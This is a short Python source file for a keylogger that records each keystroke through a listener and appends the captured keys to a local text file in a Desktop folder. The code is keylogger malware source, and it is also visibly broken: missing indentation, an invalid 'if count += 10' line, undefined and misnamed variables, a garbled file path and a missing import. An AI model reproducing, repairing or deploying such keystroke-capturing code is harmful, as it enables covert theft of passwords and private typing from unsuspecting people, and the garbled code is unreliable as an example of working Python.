﻿
keys = []


key_info = "keefo.txt"


file_loc= "C:\\Users\\Insta\\Desktop\\Recipes\\keefo.txt"


extend = '\\'


def on_press(key):
global keys, count
    
print(key)
keys.append(key)
count += 1
    
if count += 10
count = 0
write_file(keys)
key = []




def write_file(keys):
with open(key_info + file_loc + extend, "a") as f:
    	for key in Keys:
        	k = str(key).replace("'", "")
        	if k.find("space") > 0:
            	f.write("\n ")
            	f.close()
        	elif k.find("Key") == -1:
            	f.write(k)
def on_release(key):
if Key == Key.esc:
    	return False
    
with Listener(on_press=on_press, on_release=on_release) as listener:
listener.join()
    
